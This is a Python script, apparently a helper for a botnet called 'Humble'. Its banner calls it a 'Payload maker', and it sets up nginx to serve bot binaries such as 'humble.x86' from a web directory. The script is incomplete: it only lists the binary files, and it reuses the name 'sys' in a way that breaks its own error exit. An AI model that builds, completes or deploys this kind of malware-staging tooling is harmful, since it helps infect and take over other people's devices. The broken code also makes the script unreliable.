import os
import base64
import requests
import subprocess


def banner():
    print(base64.b64decode("CiBfICAgIF8gICAgICAgICAgICAgICAgIF8gICAgIF8KfCB8ICB8IHwgICAgICAgICAgICAgICB8IHwgICB8IHwKfCB8X198IHxfICAgXyBfIF9fIF9fXyB8IHxfXyB8IHwgX19fCnwgIF9fICB8IHwgfCB8ICdfIGAgXyBcfCAnXyBcfCB8LyBfIFwKfCB8ICB8IHwgfF98IHwgfCB8IHwgfCB8IHxfKSB8IHwgIF9fLwp8X3wgIHxffFxfXyxffF98IHxffCB8X3xfLl9fL3xffFxfX198CgogICAgICAgICAgIFBheWxvYWQgbWFrZXIKICAgICAgICAgTWFkZSBieSBIaXJvc2hpbWEK==").decode("utf-8"))


def get_ip():
    try:
        IP_ADDRESS = requests.get('https://checkip.amazonaws.com').text.strip()
    except:
        IP_ADDRESS = "127.0.0.1"
    return IP_ADDRESS


def execute(cmd):
    subprocess.call(cmd, shell=True)


def installs_func():
    print("Im detecting your system now.")
    sys = os.popen("lsb_release -d | awk -F'\t' '{print $2}' | awk -F ' ' '{print $1}'").read().strip('\n')
    try:
        verify = input("Is your system '"+str(sys)+"'? [Y/n]") or "Y"
    except:
        verify = "Y"

    if (verify != "Y"):
        sys = input("What is your operating system? [ubuntu/debian/centos]: ")
    else:
        sys = sys

    if ("ubuntu" in sys.lower() or "debian" in sys.lower()):
        execute("apt install nginx -y;service nginx restart")
    elif ("centos" in sys.lower()):
        execute("yum install nginx -y;systemctl restart nginx")
    else:
        print("\033[93mERROR! Unknown system. I can't process it.")
        sys.exit()

        


def get_data():
    try:
        http_dir = input("Enter directory for your bins [/var/www/html/hhh]: ")
    except:
        print("1312")
        http_dir = "/var/www/html/hhh"
    try:
        bin_name = input("Enter name for bins [humble]: ") or "humble"
    except:
        bin_name = "humble"
    try:
        installs = input("Should we prepare services (nginx)? [Y/n]") or "Y"
    except:
        installs = "Y"
    print("\nOkay, now current data.")
    print("\n\033[93mWARNING! Don't put / on the directory on next question!")
    print("It must look like '/root/humble/release/bins' not '/root/humble/release/bins/'.\033[0m")
    try:
        curr_dir = input("\nWhere are your current bins stored (the humble.x86 files)? [/root/humble/release/bins]") or "/root/humble/release/bins"
    except:
        curr_dir = "/root/humble/release/bins"
    if (installs == "Y" or installs == "y"):
        installs_return = True
    else:
        installs_return = False

    print("\n\033[92mSUCCESS! We're finished with getting data, now let's the start work.\033[0m")
    return http_dir, bin_name, installs_return, curr_dir

def main():
    # show banner
    banner()
    # get data into variables
    http_dir, bin_name, installs, curr_dir = get_data()
    if (installs):
        installs_func()

    for file in os.listdir(curr_dir):
        print(file)

main()

